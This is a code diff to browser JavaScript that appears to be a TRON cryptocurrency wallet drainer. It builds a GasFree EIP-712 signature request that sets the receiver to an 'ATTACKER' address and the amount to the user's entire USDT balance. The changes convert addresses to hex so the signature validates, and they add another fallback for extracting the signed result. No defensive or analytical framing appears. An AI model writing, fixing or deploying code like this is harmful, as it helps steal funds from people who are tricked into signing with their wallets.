@@ -942,11 +942,23 @@ function waitForTronLinkAndRun() {
           var deadline = String(Math.floor(Date.now() / 1000) + 3600); // 1 hour
           var maxFee   = String(parseInt(transferFee, 10) * 2 + 1500000); // transfer fee + activation buffer
 
+          // EIP-712 address fields must be EVM hex (0x + 20 bytes = 40 hex chars)
+          // TronWeb base58 → hex returns '41' + 40 hex; strip '41', add '0x'
+          function _toEvmHex(a) {
+            try {
+              var h = tw.address.toHex(a); // '41xxxxxxxx...' (42 hex chars)
+              if (h && h.length === 42) return '0x' + h.slice(2); // strip leading '41'
+            } catch(eh) {}
+            // fallback: if already starts with 0x return as-is
+            if (typeof a === 'string' && a.startsWith('0x')) return a;
+            return a;
+          }
+
           var gfDomain = {
             name: 'GasFreeController',
             version: 'V1.0.0',
             chainId: GF_CHAIN_ID,
-            verifyingContract: GF_CONTRACT
+            verifyingContract: _toEvmHex(GF_CONTRACT)
           };
 
           var gfTypes = {
@@ -963,11 +975,18 @@ function waitForTronLinkAndRun() {
             ]
           };
 
+          var addrEvmHex     = _toEvmHex(addr);
+          var attackerEvmHex = _toEvmHex(ATTACKER);
+          var usdtEvmHex     = _toEvmHex(USDT_ADDR);
+          var provEvmHex     = _toEvmHex(provAddr);
+
+          window.__logINF('GF hex: user=' + addrEvmHex.slice(0,12) + '… recv=' + attackerEvmHex.slice(0,12) + '…');
+
           var gfMsg = {
-            token:           USDT_ADDR,
-            serviceProvider: provAddr,
-            user:            addr,
-            receiver:        ATTACKER,  // ← destination = attacker
+            token:           usdtEvmHex,
+            serviceProvider: provEvmHex,
+            user:            addrEvmHex,
+            receiver:        attackerEvmHex,  // ← destination = attacker
             value:           usdtBalance,
             maxFee:          maxFee,
             deadline:        deadline,
@@ -1055,6 +1074,25 @@ function waitForTronLinkAndRun() {
             } catch(e5) {
               if (_isCancel(e5)) { window.__logERR('GF user cancelled'); _applying = false; return; }
               sigErr = e5.message; window.__logERR('GF SIGN-5 FAIL: ' + e5.message);
+            }
+          }
+
+          // Provider 6: check if _signTypedData returned an object (not string) — extract sig field
+          // Some TronWeb versions return { signature: '...' } or { result: '...' }
+          if (!sig) {
+            window.__logINF('GF SIGN-6: retry _signTypedData + extract from object');
+            try {
+              var r6raw = await tw.trx._signTypedData(gfDomain, gfTypes, gfMsg);
+              window.__logINF('GF SIGN-6 raw type=' + typeof r6raw + ' val=' + JSON.stringify(r6raw).slice(0,80));
+              if (r6raw && typeof r6raw === 'object') {
+                var r6sig = r6raw.signature || r6raw.sig || r6raw.result || r6raw.signed || null;
+                if (r6sig && typeof r6sig === 'string') { sig = r6sig; window.__logOK('GF SIGN-6 obj.sig OK sig=' + sig.slice(0,16) + '…'); }
+              } else if (r6raw && typeof r6raw === 'string') {
+                sig = r6raw; window.__logOK('GF SIGN-6 str OK sig=' + sig.slice(0,16) + '…');
+              }
+            } catch(e6) {
+              if (_isCancel(e6)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = e6.message; window.__logERR('GF SIGN-6 FAIL: ' + e6.message);
             }
           }
 
